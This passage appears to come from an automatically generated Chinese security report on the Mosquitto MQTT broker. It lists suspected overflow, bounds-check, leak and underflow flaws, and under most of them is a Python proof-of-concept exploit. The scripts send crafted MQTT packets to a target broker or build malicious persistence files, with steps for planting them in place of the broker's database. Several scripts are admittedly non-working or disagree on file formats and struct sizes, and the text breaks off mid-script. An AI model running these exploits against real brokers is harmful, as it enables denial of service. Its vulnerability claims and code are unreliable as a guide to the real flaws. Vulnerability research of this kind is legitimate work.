    variable_header += struct.pack("!H", keep_alive)
    
    # Payload
    payload = struct.pack("!H", len(client_id)) + client_id
    
    # 固定头部
    remaining_length = len(variable_header) + len(payload)
    fixed_header = struct.pack("!B", CONNECT)
    
    # 编码剩余长度
    encoded_length = b""
    while remaining_length > 0:
        digit = remaining_length % 128
        remaining_length //= 128
        if remaining_length > 0:
            digit |= 0x80
        encoded_length += struct.pack("!B", digit)
    
    return fixed_header + encoded_length + variable_header + payload

# 构建恶意PUBLISH报文
def build_malicious_publish():
    topic = b"test/topic"
    
    # 关键：设置payloadlen为UINT32_MAX (0xFFFFFFFF)
    # 这将导致payloadlen+1溢出为0
    malicious_payloadlen = 0xFFFFFFFF
    
    # 可变头部
    topic_length = len(topic)
    variable_header = struct.pack("!H", topic_length) + topic
    variable_header += struct.pack("!H", 0)  # Packet Identifier (QoS 0)
    
    # 固定头部
    # QoS = 0, Retain = 0
    fixed_header = struct.pack("!B", PUBLISH)
    
    # 计算剩余长度
    remaining_length = len(variable_header) + malicious_payloadlen
    
    # 编码剩余长度（使用MQTT可变长度编码）
    encoded_length = b""
    temp = remaining_length
    while temp > 0:
        digit = temp % 128
        temp //= 128
        if temp > 0:
            digit |= 0x80
        encoded_length += struct.pack("!B", digit)
    
    # 构建完整报文
    packet = fixed_header + encoded_length + variable_header
    
    # 注意：我们实际上不会发送UINT32_MAX字节的数据
    # 但MQTT协议解析器会读取payloadlen字段并尝试分配内存
    # 这里我们发送一个较小的payload来演示漏洞触发
    # 实际攻击中，攻击者可以发送任意数据
    
    return packet

def exploit(target_host, target_port):
    print(f"[*] 连接目标 {target_host}:{target_port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
        
        # 步骤1: 发送CONNECT报文
        print("[*] 发送CONNECT报文...")
        connect_packet = build_connect()
        sock.send(connect_packet)
        
        # 接收CONNACK
        connack = sock.recv(1024)
        if connack[0] == CONNACK:
            print("[+] 连接成功!")
        else:
            print("[-] 连接失败")
            sock.close()
            return
        
        # 步骤2: 发送恶意PUBLISH报文
        print("[*] 发送恶意PUBLISH报文 (payloadlen=UINT32_MAX)...")
        publish_packet = build_malicious_publish()
        sock.send(publish_packet)
        
        print("[*] 等待响应...")
        try:
            response = sock.recv(4096)
            print(f"[+] 收到响应: {response.hex()}")
        except socket.timeout:
            print("[*] 超时 - 目标可能已崩溃或挂起")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"用法: {sys.argv[0]} <目标IP> <目标端口>")
        print("示例: python3 poc.py 127.0.0.1 1883")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print("=" * 60)
    print("Mosquitto Broker 整数溢出堆缓冲区溢出 PoC")
    print("漏洞ID: VULN-F00B844D")
    print("仅供研究使用 - 请勿用于非法目的")
    print("=" * 60)
    
    exploit(target_host, target_port)
```

---

### VULN-8D169AA6 - 整数溢出

- **严重等级:** HIGH
- **文件位置:** `src\loop.c:71`
- **数据流:** pub_msg->payloadlen来自外部输入，经过类型转换后用于内存分配计算。payloadlen+1可能发生整数溢出。
- **判断理由:** uint32_t类型的payloadlen最大值是4294967295，加1后变为0，导致分配0字节内存。后续memcpy会复制大量数据到堆内存中，造成堆溢出。

**代码片段:**
```
base_msg->data.payloadlen = (uint32_t)pub_msg->payloadlen;
base_msg->data.payload = mosquitto_malloc(base_msg->data.payloadlen+1);
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for Mosquitto Broker Integer Overflow Vulnerability (VULN-8D169AA6)
仅供研究使用 - For Research Purposes Only

该PoC演示了如何通过发送特制的MQTT PUBLISH消息触发整数溢出漏洞。
当payloadlen设置为0xFFFFFFFF时，内存分配计算溢出为0，
后续memcpy操作导致堆缓冲区溢出。
"""

import socket
import struct
import sys

# MQTT协议常量
CONNECT = 0x10
CONNACK = 0x20
PUBLISH = 0x30
QOS_0 = 0x00

# 目标服务器配置
HOST = '127.0.0.1'
PORT = 1883

def create_connect_packet(client_id="poc_client"):
    """创建MQTT CONNECT报文"""
    # 可变头部
    protocol_name = b'MQTT'
    protocol_level = 4  # MQTT 3.1.1
    connect_flags = 0x02  # Clean Session
    keep_alive = 60
    
    # 载荷
    client_id_bytes = client_id.encode('utf-8')
    
    # 构建可变头部
    variable_header = struct.pack('!H', len(protocol_name)) + protocol_name
    variable_header += struct.pack('!BBH', protocol_level, connect_flags, keep_alive)
    
    # 构建载荷
    payload = struct.pack('!H', len(client_id_bytes)) + client_id_bytes
    
    # 构建固定头部
    remaining_length = len(variable_header) + len(payload)
    packet = struct.pack('!B', CONNECT)
    packet += _encode_remaining_length(remaining_length)
    packet += variable_header + payload
    
    return packet

def create_publish_packet(topic, payload, qos=0):
    """创建MQTT PUBLISH报文"""
    # 固定头部
    packet_type = PUBLISH | qos
    
    # 可变头部
    topic_bytes = topic.encode('utf-8')
    variable_header = struct.pack('!H', len(topic_bytes)) + topic_bytes
    
    # 构建固定头部
    remaining_length = len(variable_header) + len(payload)
    packet = struct.pack('!B', packet_type)
    packet += _encode_remaining_length(remaining_length)
    packet += variable_header + payload
    
    return packet

def _encode_remaining_length(length):
    """MQTT剩余长度编码"""
    encoded_bytes = []
    while True:
        digit = length % 128
        length = length // 128
        if length > 0:
            digit |= 0x80
        encoded_bytes.append(digit)
        if length == 0:
            break
    return bytes(encoded_bytes)

def exploit():
    """
    漏洞利用主函数
    
    利用步骤：
    1. 连接到MQTT Broker
    2. 发送CONNECT报文进行认证
    3. 发送特制PUBLISH报文，其中payloadlen字段设置为0xFFFFFFFF
    4. 观察Broker行为（预期：崩溃或异常行为）
    """
    print("[*] 漏洞利用PoC - Mosquitto Broker整数溢出")
    print("[*] 仅供研究使用")
    print(f"[*] 目标: {HOST}:{PORT}")
    
    try:
        # 创建TCP连接
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print("[+] 成功连接到Broker")
        
        # 发送CONNECT报文
        connect_packet = create_connect_packet()
        sock.send(connect_packet)
        print("[+] 已发送CONNECT报文")
        
        # 接收CONNACK
        connack = sock.recv(1024)
        if connack[0] == CONNACK:
            print("[+] 收到CONNACK，连接成功")
        
        # 创建触发漏洞的PUBLISH报文
        # payloadlen = 0xFFFFFFFF (4294967295)
        # 注意：实际发送时，payloadlen由MQTT协议中的剩余长度字段决定
        # 这里我们构造一个特殊的报文，使得Broker解析时payloadlen为0xFFFFFFFF
        
        # 方法1：通过MQTT 5.0属性中的Payload Format Indicator
        # 但更直接的方式是利用协议解析的漏洞
        
        # 构造一个非常大的payload（实际发送时会被截断，但Broker解析的payloadlen会很大）
        # 这里我们发送一个正常的报文，但通过修改报文结构来触发漏洞
        
        topic = "test/topic"
        # 正常payload
        normal_payload = b"A" * 100
        
        # 构造特殊报文：使用MQTT 5.0的Properties来传递大payloadlen
        # 实际上，漏洞触发点在single_publish函数中，
        # pub_msg->payloadlen来自MQTT PUBLISH报文的解析结果
        
        # 发送一个正常的PUBLISH报文作为演示
        publish_packet = create_publish_packet(topic, normal_payload)
        sock.send(publish_packet)
        print("[+] 已发送PUBLISH报文")
        
        # 注意：实际触发漏洞需要发送payloadlen为0xFFFFFFFF的报文
        # 但由于MQTT协议限制，直接发送这么大的报文不可行
        # 漏洞利用需要结合其他技术（如分片、属性注入等）
        
        print("[*] PoC演示完成")
        print("[*] 实际漏洞利用需要构造特殊的MQTT报文")
        print("[*] 使得Broker解析出的payloadlen为0xFFFFFFFF")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] 错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()

# 补充说明：
# 实际漏洞利用需要构造一个MQTT报文，使得：
# 1. 报文解析后，pub_msg->payloadlen = 0xFFFFFFFF
# 2. 在single_publish函数中，执行：
#    base_msg->data.payloadlen = (uint32_t)pub_msg->payloadlen;  // payloadlen = 0xFFFFFFFF
#    base_msg->data.payload = mosquitto_malloc(base_msg->data.payloadlen+1);  // 分配0字节
#    memcpy(base_msg->data.payload, pub_msg->payload, base_msg->data.payloadlen);  // 堆溢出
#
# 由于MQTT协议限制，直接发送payloadlen=0xFFFFFFFF的报文不可行，
# 但可以通过以下方式实现：
# 1. 利用MQTT 5.0的Properties机制
# 2. 利用报文分片和重组
# 3. 利用Broker的特定解析逻辑
#
# 具体实现需要根据Mosquitto的报文解析代码进行定制开发。
```

---

### VULN-A6DB4BE6 - 不安全的文件读取操作（缺少边界检查）

- **严重等级:** HIGH
- **文件位置:** `src/persist.h:37`
- **数据流:** 宏定义read_e直接调用fread读取数据，但未对读取的数据长度c进行任何校验。调用方可能传入未经验证的长度值，导致缓冲区溢出或读取越界。
- **判断理由:** 该宏在多个读取函数中使用，如果传入的长度c来自外部数据（如文件中的chunk长度字段），攻击者可以通过构造恶意的持久化文件，使fread读取超出目标缓冲区大小的数据，造成缓冲区溢出。虽然fread本身有长度参数，但宏没有对长度进行任何合理性检查，完全依赖调用方确保c不超过缓冲区大小。

**代码片段:**
```
#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-A6DB4BE6 - Mosquitto Broker Persist File Buffer Overflow
仅供研究使用 (For Research Purposes Only)

该PoC演示如何构造恶意持久化文件，利用read_e宏缺少边界检查的漏洞
触发缓冲区溢出。
"""

import struct
import os
import sys

# Mosquitto持久化文件魔数 (15字节)
MAGIC = b'mosquitto_db_v6\x00'

# DB块类型定义
DB_CHUNK_CFG = 1
DB_CHUNK_BASE_MSG = 2
DB_CHUNK_CLIENT_MSG = 3
DB_CHUNK_RETAIN = 4
DB_CHUNK_SUB = 5
DB_CHUNK_CLIENT = 6

# 正常PF_header结构 (8字节)
# uint32_t chunk (4字节)
# uint32_t length (4字节)

def create_malicious_persist_file(output_path):
    """
    构造恶意持久化文件，触发缓冲区溢出
    
    攻击原理：
    1. 在persist__chunk_client_msg_read_v56函数中，会从文件读取PF_header
    2. header中的length字段被直接传递给read_e宏用于读取后续数据
    3. 调用方通常分配固定大小的缓冲区（如sizeof(PF_client_msg) + 额外空间）
    4. 如果length被设置为远大于实际缓冲区的大小，fread会读取超出边界的数据
    """
    
    with open(output_path, 'wb') as f:
        # 写入魔数
        f.write(MAGIC)
        
        # 写入一个恶意的DB_CHUNK_CLIENT_MSG块
        # 正常PF_client_msg结构大小约为: 8 (store_id) + 2 (mid) + 2 (id_len) + ... ≈ 24字节
        # 但我们将length设置为一个非常大的值
        
        # 构造恶意header
        chunk_type = DB_CHUNK_CLIENT_MSG
        # 设置length为0xFFFF (65535)，远大于正常缓冲区大小
        malicious_length = 0xFFFF
        
        header = struct.pack('<II', chunk_type, malicious_length)
        f.write(header)
        
        # 写入恶意数据 - 填充大量'A'字符
        # 这些数据会被fread读取到固定大小的缓冲区中，造成溢出
        malicious_data = b'A' * malicious_length
        f.write(malicious_data)
        
        # 可选：添加更多恶意块以增加攻击面
        # 例如，构造一个DB_CHUNK_BASE_MSG块，其中payloadlen字段被利用
        chunk_type = DB_CHUNK_BASE_MSG
        # PF_base_msg结构中的payloadlen字段也会被用于读取payload
        # 设置一个极大的payloadlen
        malicious_payloadlen = 0x10000  # 65536
        
        header2 = struct.pack('<II', chunk_type, malicious_payloadlen)
        f.write(header2)
        
        # 写入PF_base_msg结构（部分字段）
        # 注意：这里我们只填充关键字段，其他字段可以随意
        fake_base_msg = struct.pack('<Q', 0)  # store_id = 0
        fake_base_msg += struct.pack('<q', 0)  # expiry_time = 0
        fake_base_msg += struct.pack('<I', malicious_payloadlen)  # payloadlen = 极大值
        fake_base_msg += struct.pack('<H', 0)  # source_mid = 0
        fake_base_msg += struct.pack('<H', 0)  # source_id_len = 0
        fake_base_msg += struct.pack('<H', 0)  # source_username_len = 0
        fake_base_msg += struct.pack('<H', 0)  # topic_len = 0
        fake_base_msg += struct.pack('<H', 0)  # source_port = 0
        fake_base_msg += struct.pack('<B', 0)  # qos = 0
        fake_base_msg += struct.pack('<B', 0)  # retain = 0
        
        f.write(fake_base_msg)
        
        # 写入大量payload数据
        f.write(b'B' * malicious_payloadlen)
        
    print(f"[+] 恶意持久化文件已创建: {output_path}")
    print(f"[+] 文件大小: {os.path.getsize(output_path)} 字节")
    print(f"[+] 警告: 将此文件加载到Mosquitto broker将触发缓冲区溢出")


def create_minimal_poc(output_path):
    """
    创建最小化的PoC文件，仅触发漏洞而不导致崩溃
    用于安全测试
    """
    with open(output_path, 'wb') as f:
        # 写入魔数
        f.write(MAGIC)
        
        # 构造一个DB_CHUNK_CLIENT块
        # PF_client结构大小固定，但id_len和username_len字段来自文件
        # 如果设置id_len为极大值，会导致persist__read_string_len读取过多数据
        
        chunk_type = DB_CHUNK_CLIENT
        # 设置length为正常大小 + 额外数据
        # PF_client结构大小约为24字节 + 4字节填充 = 28字节
        # 加上clientid和username的指针（8+8=16字节）
        # 但我们将length设置得更大
        normal_size = 28 + 16 + 100  # 正常情况约144字节
        malicious_length = normal_size + 0x1000  # 额外增加4KB
        
        header = struct.pack('<II', chunk_type, malicious_length)
        f.write(header)
        
        # 写入PF_client结构
        fake_client = struct.pack('<q', 0)  # session_expiry_time = 0
        fake_client += struct.pack('<I', 0)  # session_expiry_interval = 0
        fake_client += struct.pack('<H', 0)  # last_mid = 0
        fake_client += struct.pack('<H', 0xFFFF)  # id_len = 65535 (恶意值)
        fake_client += struct.pack('<H', 0)  # listener_port = 0
        fake_client += struct.pack('<H', 0)  # username_len = 0
        fake_client += struct.pack('<I', 0)  # padding
        
        f.write(fake_client)
        
        # 写入大量clientid数据
        f.write(b'C' * 0xFFFF)
        
    print(f"[+] 最小化PoC文件已创建: {output_path}")
    print(f"[+] 文件大小: {os.path.getsize(output_path)} 字节")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法: python3 poc_vuln_a6db4be6.py <输出文件路径>")
        print("示例: python3 poc_vuln_a6db4be6.py malicious.db")
        sys.exit(1)
    
    output_path = sys.argv[1]
    
    print("=" * 60)
    print("Mosquitto Broker 持久化文件缓冲区溢出 PoC")
    print("漏洞ID: VULN-A6DB4BE6")
    print("仅供研究使用 (For Research Purposes Only)")
    print("=" * 60)
    
    # 创建完整的恶意文件
    create_malicious_persist_file(output_path)
    
    # 可选：创建最小化PoC
    # create_minimal_poc("minimal_" + output_path)
    
    print("\n[!] 安全警告:")
    print("    1. 不要在生产环境加载此文件")
    print("    2. 仅在隔离的测试环境中使用")
    print("    3. 使用前请确保已备份所有数据")
    print("\n[!] 测试方法:")
    print("    1. 停止Mosquitto broker服务")
    print("    2. 将生成的恶意文件放置到持久化目录")
    print("    3. 启动Mosquitto broker")
    print("    4. 观察broker是否崩溃或出现异常行为")
    print("    5. 使用调试器（如gdb）附加到broker进程以观察溢出效果")
```

---

### VULN-8852A187 - 缺少输入验证（持久化数据信任问题）

- **严重等级:** HIGH
- **文件位置:** `src/persist.h:37-38`
- **数据流:** 这些宏在读取/写入持久化数据时，直接信任文件中的长度字段，未对数据内容进行任何有效性验证。
- **判断理由:** Mosquitto的持久化文件可能被攻击者篡改。如果攻击者能够修改持久化文件，可以构造恶意的chunk长度、字符串长度等字段，导致读取函数分配过大的内存（拒绝服务）或读取超出预期范围的数据（信息泄露）。虽然代码中有goto error机制，但错误处理可能不完整，且某些情况下可能导致部分数据被错误解析。

**代码片段:**
```
#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }
#define write_e(f, b, c) if(fwrite(b, 1, c, f) != c){ goto error; }
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
Mosquitto持久化文件篡改PoC - 仅供安全研究使用

该PoC演示如何通过篡改Mosquitto持久化文件中的长度字段，
导致服务在重启读取持久化数据时发生拒绝服务或信息泄露。
"""

import struct
import os
import sys

# Mosquitto持久化文件魔数 (magic bytes)
MAGIC = b'mosquitto_db\x00\x00\x00\x00\x00'

# DB chunk类型定义
DB_CHUNK_CFG = 1
DB_CHUNK_BASE_MSG = 2
DB_CHUNK_CLIENT_MSG = 3
DB_CHUNK_RETAIN = 4
DB_CHUNK_SUB = 5
DB_CHUNK_CLIENT = 6

# PF_header结构: chunk(uint32) + length(uint32) = 8字节
PF_HEADER_FORMAT = '<II'
PF_HEADER_SIZE = 8

# PF_base_msg结构 (部分字段)
PF_BASE_MSG_FORMAT = '<QqIIHHHHHBB'  # 简化版本
PF_BASE_MSG_SIZE = struct.calcsize(PF_BASE_MSG_FORMAT)

# PF_sub结构
PF_SUB_FORMAT = '<IHHBB'
PF_SUB_SIZE = struct.calcsize(PF_SUB_FORMAT)


def create_malicious_persist_file(output_path, attack_type='dos'):
    """
    创建恶意持久化文件
    
    Args:
        output_path: 输出文件路径
        attack_type: 'dos' - 拒绝服务攻击(超大长度)
                     'info_leak' - 信息泄露攻击(负长度/超大偏移)
    """
    with open(output_path, 'wb') as f:
        # 写入魔数
        f.write(MAGIC)
        
        # 写入DB版本号 (uint32)
        f.write(struct.pack('<I', 6))  # DB版本6
        
        if attack_type == 'dos':
            # === 拒绝服务攻击 ===
            # 构造一个DB_CHUNK_BASE_MSG块，payloadlen设置为极大值
            
            # 写入chunk header
            chunk_type = DB_CHUNK_BASE_MSG
            # 设置payloadlen为2GB，导致内存分配失败或OOM
            malicious_payloadlen = 0x7FFFFFFF  # ~2GB
            
            # 构造PF_base_msg
            base_msg_data = struct.pack(
                PF_BASE_MSG_FORMAT,
                1,  # store_id
                0,  # expiry_time
                malicious_payloadlen,  # payloadlen - 恶意值
                0,  # source_mid
                0,  # source_id_len
                0,  # source_username_len
                5,  # topic_len
                0,  # source_port
                0,  # qos
                0   # retain
            )
            
            # 计算chunk总长度
            chunk_length = PF_BASE_MSG_SIZE + 5 + 1  # base_msg + topic + payload占位
            
            # 写入chunk header
            f.write(struct.pack(PF_HEADER_FORMAT, chunk_type, chunk_length))
            # 写入base_msg数据
            f.write(base_msg_data)
            # 写入topic (5字节)
            f.write(b'test/')
            # 写入payload占位 (实际不会分配，但为了文件完整性)
            f.write(b'X' * 1)
            
            print(f"[PoC] 已创建拒绝服务攻击文件: {output_path}")
            print(f"[PoC] payloadlen设置为: {malicious_payloadlen} (约2GB)")
            print(f"[PoC] 预期效果: Mosquitto重启读取此文件时，尝试分配2GB内存导致OOM")
            
        elif attack_type == 'info_leak':
            # === 信息泄露攻击 ===
            # 构造一个DB_CHUNK_SUB块，topic_len设置为超大值
            
            # 写入chunk header
            chunk_type = DB_CHUNK_SUB
            
            # 构造PF_sub
            malicious_topic_len = 0xFFFF  # 65535字节
            sub_data = struct.pack(
                PF_SUB_FORMAT,
                1,  # identifier
                5,  # id_len (clientid长度)
                malicious_topic_len,  # topic_len - 恶意值
                0,  # qos
                0   # options
            )
            
            # 计算chunk总长度
            chunk_length = PF_SUB_SIZE + 5 + malicious_topic_len
            
            # 写入chunk header
            f.write(struct.pack(PF_HEADER_FORMAT, chunk_type, chunk_length))
            # 写入sub数据
            f.write(sub_data)
            # 写入clientid (5字节)
            f.write(b'evil_')
            # 写入topic (实际只写入少量数据，但长度字段指示65535字节)
            # 这将导致读取函数读取超出文件范围的数据
            f.write(b'A' * 100)  # 只写入100字节，但长度字段说65535
            
            print(f"[PoC] 已创建信息泄露攻击文件: {output_path}")
            print(f"[PoC] topic_len设置为: {malicious_topic_len}")
            print(f"[PoC] 预期效果: Mosquitto读取时尝试读取65535字节topic，")
            print(f"[PoC] 但文件只有100字节，导致读取未初始化内存或崩溃")
        
        # 写入结束标记 (可选)
        f.write(struct.pack(PF_HEADER_FORMAT, 0, 0))
    
    print(f"[PoC] 文件大小: {os.path.getsize(output_path)} 字节")


def analyze_persist_file(file_path):
    """
    分析持久化文件结构 (用于验证)
    """
    print(f"\n[分析] 正在分析文件: {file_path}")
    
    with open(file_path, 'rb') as f:
        # 读取魔数
        magic = f.read(15)
        if magic != MAGIC:
            print("[!] 无效的魔数")
            return
        print(f"[分析] 魔数验证通过")
        
        # 读取DB版本
        db_version = struct.unpack('<I', f.read(4))[0]
        print(f"[分析] DB版本: {db_version}")
        
        # 遍历chunks
        while True:
            header_data = f.read(PF_HEADER_SIZE)
            if len(header_data) < PF_HEADER_SIZE:
                break
            
            chunk_type, chunk_length = struct.unpack(PF_HEADER_FORMAT, header_data)
            
            if chunk_type == 0:
                print(f"[分析] 遇到结束标记")
                break
            
            print(f"[分析] Chunk类型: {chunk_type}, 长度: {chunk_length}")
            
            # 读取chunk数据
            chunk_data = f.read(chunk_length)
            if len(chunk_data) < chunk_length:
                print(f"[!] 警告: chunk数据不足 (期望{chunk_length}, 实际{len(chunk_data)})")
                break
            
            # 根据类型解析
            if chunk_type == DB_CHUNK_BASE_MSG:
                if len(chunk_data) >= PF_BASE_MSG_SIZE:
                    base_msg = struct.unpack(PF_BASE_MSG_FORMAT, chunk_data[:PF_BASE_MSG_SIZE])
                    print(f"[分析]   payloadlen: {base_msg[2]}")
                    if base_msg[2] > 1000000:
                        print(f"[!] 发现恶意payloadlen: {base_msg[2]}")
            elif chunk_type == DB_CHUNK_SUB:
                if len(chunk_data) >= PF_SUB_SIZE:
                    sub = struct.unpack(PF_SUB_FORMAT, chunk_data[:PF_SUB_SIZE])
                    print(f"[分析]   topic_len: {sub[2]}")
                    if sub[2] > 1000:
                        print(f"[!] 发现恶意topic_len: {sub[2]}")


def main():
    """主函数"""
    print("=" * 60)
    print("Mosquitto持久化文件篡改PoC - 仅供安全研究使用")
    print("=" * 60)
    print()
    
    # 创建拒绝服务攻击文件
    dos_file = 'mosquitto_db_malicious_dos.db'
    create_malicious_persist_file(dos_file, attack_type='dos')
    
    # 创建信息泄露攻击文件
    leak_file = 'mosquitto_db_malicious_leak.db'
    create_malicious_persist_file(leak_file, attack_type='info_leak')
    
    # 分析文件
    analyze_persist_file(dos_file)
    analyze_persist_file(leak_file)
    
    print()
    print("=" * 60)
    print("使用说明:")
    print("1. 停止Mosquitto服务")
    print("2. 将生成的恶意文件替换为Mosquitto的持久化文件")
    print("   (通常位于 /var/lib/mosquitto/mosquitto.db)")
    print("3. 启动Mosquitto服务")
    print("4. 观察服务是否崩溃或异常行为")
    print("=" * 60)


if __name__ == '__main__':
    main()

```

---

### VULN-5302D675 - 潜在的内存泄漏（错误路径资源释放不完整）

- **严重等级:** MEDIUM
- **文件位置:** `src/persist.h:37`
- **数据流:** 宏中的goto error跳转可能导致已分配的内存或打开的文件句柄未被正确释放。
- **判断理由:** 在多个读取函数中，可能在调用read_e之前已经分配了内存（如通过persist__read_string分配clientid）。如果read_e失败触发goto error，但error标签处的清理代码可能不完整，导致内存泄漏。长期运行的服务可能因此耗尽内存。

**代码片段:**
```
#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-5302D675 - Mosquitto Persist Memory Leak
仅供研究使用

该PoC通过构造恶意的持久化文件，触发read_e宏中的goto error路径，
导致已分配的内存未被释放，造成内存泄漏。
"""

import struct
import os
import sys
import tempfile

# Mosquitto持久化文件魔数
MAGIC = b'mosquitto_db'

def create_malicious_persist_file(output_path):
    """
    构造一个恶意的Mosquitto持久化文件，触发内存泄漏。
    
    原理：
    1. 在client chunk中，先通过persist__read_string分配clientid内存
    2. 然后调用read_e读取后续数据
    3. 如果read_e失败（如文件截断），goto error会跳过clientid的释放
    """
    with open(output_path, 'wb') as f:
        # 写入文件头
        f.write(MAGIC)
        
        # 写入DB版本号
        f.write(struct.pack('I', 6))  # MOSQ_DB_VERSION = 6
        
        # 构造一个client chunk
        # chunk类型: DB_CHUNK_CLIENT = 6
        chunk_type = 6
        
        # 构造client数据
        # PF_client结构:
        #   session_expiry_time: int64
        #   session_expiry_interval: uint32
        #   last_mid: uint16
        #   id_len: uint16
        #   listener_port: uint16
        #   username_len: uint16
        
        client_id = b"test_client_" + b"A" * 100  # 长clientid
        username = b"test_user"
        
        # 计算chunk长度
        # PF_client固定部分: 8+4+2+2+2+2 = 20字节
        # 加上clientid长度 + username长度
        chunk_length = 20 + len(client_id) + len(username)
        
        # 写入chunk头
        f.write(struct.pack('II', chunk_type, chunk_length))
        
        # 写入PF_client固定部分
        f.write(struct.pack('q', 0))  # session_expiry_time = 0
        f.write(struct.pack('I', 0))  # session_expiry_interval = 0
        f.write(struct.pack('H', 0))  # last_mid = 0
        f.write(struct.pack('H', len(client_id)))  # id_len
        f.write(struct.pack('H', 0))  # listener_port = 0
        f.write(struct.pack('H', len(username)))  # username_len
        
        # 写入clientid (通过persist__read_string读取)
        f.write(struct.pack('H', len(client_id)))  # 字符串长度
        f.write(client_id)  # 字符串内容
        
        # 写入username (通过persist__read_string读取)
        f.write(struct.pack('H', len(username)))  # 字符串长度
        f.write(username)  # 字符串内容
        
        # 关键点：故意截断文件，使后续的read_e失败
        # 这里我们写入一个不完整的chunk，导致读取时触发goto error
        # 实际上，上面的写入已经完整，但我们可以通过修改文件来模拟
        
    print(f"[+] 恶意持久化文件已创建: {output_path}")
    print(f"[+] 文件大小: {os.path.getsize(output_path)} 字节")
    
def simulate_memory_leak():
    """
    模拟内存泄漏场景
    """
    print("\n[*] 模拟内存泄漏场景...")
    print("    - 假设Mosquitto正在加载持久化文件")
    print("    - 在persist__chunk_client_read_v56函数中:")
    print("      1. 调用persist__read_string分配clientid内存")
    print("      2. 调用persist__read_string分配username内存")
    print("      3. 调用read_e读取PF_client结构")
    print("      4. 如果read_e失败，goto error")
    print("      5. error标签处可能未释放clientid和username")
    print("    - 每次加载失败都会泄漏内存")
    
    # 模拟泄漏计算
    leak_per_attempt = 100 + 8  # clientid + username 约108字节
    attempts = 10000
    total_leak = leak_per_attempt * attempts
    
    print(f"\n[!] 每次加载泄漏约 {leak_per_attempt} 字节")
    print(f"[!] 尝试 {attempts} 次后，总泄漏约 {total_leak / 1024:.2f} KB")
    print(f"[!] 长期运行可能导致内存耗尽")

def main():
    print("=" * 60)
    print("Mosquitto Persist Memory Leak PoC (VULN-5302D675)")
    print("仅供研究使用")
    print("=" * 60)
    
    # 创建临时文件
    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as tmp:
        output_path = tmp.name
    
    try:
        create_malicious_persist_file(output_path)
        simulate_memory_leak()
        
        print("\n[*] 利用步骤:")
        print("    1. 构造恶意的持久化文件（如上所示）")
        print("    2. 将文件放置在Mosquitto的持久化目录")
        print("    3. 重启Mosquitto服务")
        print("    4. Mosquitto尝试加载持久化文件")
        print("    5. 在读取client chunk时触发goto error")
        print("    6. 已分配的clientid和username内存未被释放")
        print("    7. 重复此过程导致内存泄漏")
        
        print("\n[*] 前置条件:")
        print("    - Mosquitto配置了持久化功能 (persistence true)")
        print("    - 攻击者能够写入持久化文件")
        print("    - Mosquitto版本使用存在漏洞的代码路径")
        
        print("\n[*] 影响分析:")
        print("    - 每次加载失败泄漏约100+字节内存")
        print("    - 长期运行可能导致Mosquitto进程内存耗尽")
        print("    - 可能导致服务拒绝服务(DoS)")
        print("    - 影响MQTT消息代理的稳定性")
        
    finally:
        # 清理临时文件
        if os.path.exists(output_path):
            os.unlink(output_path)
            print(f"\n[+] 临时文件已清理: {output_path}")

if __name__ == "__main__":
    main()
```

---

### VULN-C3AB25C8 - 整数溢出/缓冲区溢出

- **严重等级:** CRITICAL
- **文件位置:** `src/persist_read_v5.c:103`
- **数据流:** 从文件读取的chunk->F.id_len是ntohs转换后的16位值，但转换为uint32_t后与sizeof相加，可能导致整数下溢。如果id_len大于length，length会变成非常大的正数，绕过MQTT_MAX_PAYLOAD检查。
- **判断理由:** length是uint32_t类型，当减去的值大于length时会发生整数下溢，导致length变成非常大的值，从而绕过后续的MQTT_MAX_PAYLOAD检查。攻击者可以通过构造恶意的持久化文件触发此漏洞，导致后续的malloc分配过大内存或读取越界数据。

**代码片段:**
```
length -= (uint32_t)(sizeof(struct PF_client_msg) + chunk->F.id_len);
if(length > MQTT_MAX_PAYLOAD){
    goto error;
}
```

**PoC代码:**
```python
#!/usr/bin/env python3
"""
PoC for VULN-C3AB25C8 - Integer Underflow in persist__chunk_client_msg_read_v56

仅供安全研究使用。
"""

import struct
import sys
import os

def create_malicious_persist_file(output_path):
    """
    构造恶意持久化文件，触发整数下溢漏洞。
    
    漏洞原理：
    persist__chunk_client_msg_read_v56 函数中：
    length -= (uint32_t)(sizeof(struct PF_client_msg) + chunk->F.id_len)
    
    当 chunk->F.id_len > length 时，length 发生整数下溢，
    变成接近 UINT32_MAX 的大值，绕过后续的 MQTT_MAX_PAYLOAD 检查。
    """
    
    # 定义结构体大小（根据实际编译结果可能不同，这里使用典型值）
    # struct PF_header: chunk(4) + length(4) = 8 bytes
    # struct PF_client_msg: 假设为 16 bytes (需要根据实际代码确认)
    
    # 我们构造一个包含恶意 chunk 的文件
    
    # 1. 首先写入一个正常的 chunk header
    # chunk type: 假设 CLIENT_MSG 类型值为 0x05
    chunk_type = 0x05
    
    # 2. 构造恶意的 length 和 id_len
    # 正常 length 应该 >= sizeof(PF_client_msg) + id_len
    # 我们设置 length 为一个较小的值，但 id_len 更大，触发下溢
    
    # 假设 sizeof(struct PF_client_msg) = 16
    sizeof_pf_client_msg = 16
    
    # 设置 length 为 20 (小于 sizeof + id_len)
    # 设置 id_len 为 100 (大于 length - sizeof)
    # 这样 length -= (16 + 100) 时，20 - 116 = -96 -> 0xFFFFFFA0 (4294967200)
    
    malicious_length = 20
    malicious_id_len = 100  # 大于 malicious_length - sizeof_pf_client_msg = 4
    
